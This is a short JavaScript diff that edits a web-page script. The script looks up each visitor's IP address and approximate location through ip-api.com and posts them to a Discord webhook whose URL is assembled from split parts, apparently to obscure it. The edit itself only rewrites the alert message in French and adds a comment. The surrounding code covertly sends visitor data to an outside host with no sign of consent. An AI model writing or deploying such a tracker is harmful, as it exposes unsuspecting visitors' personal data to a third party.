@@ -8,7 +8,7 @@ function sendToDiscord(ip, location) {
     const webhookUrl = part1 + part2 + part3;
     
     const message = {
-        content: `Someone visited.\n IP: ${ip}\nLocalization : ${location}`
+        content: `Nouvel visiteur sur le site.\nAdresse IP: ${ip}\nLocalisation approximative: ${location}`
     };
 
     fetch(webhookUrl, {
@@ -33,7 +33,7 @@ function getUserIPAndLocation() {
     fetch('https://ip-api.com/json')
         .then(response => response.json())
         .then(data => {
-            const ip = data.query;
+            const ip = data.query; // Corrected to 'query' if API response has IP there
             const location = `${data.city}, ${data.regionName}, ${data.country}`;
             console.log('User IP:', ip);
             console.log('Location:', location);
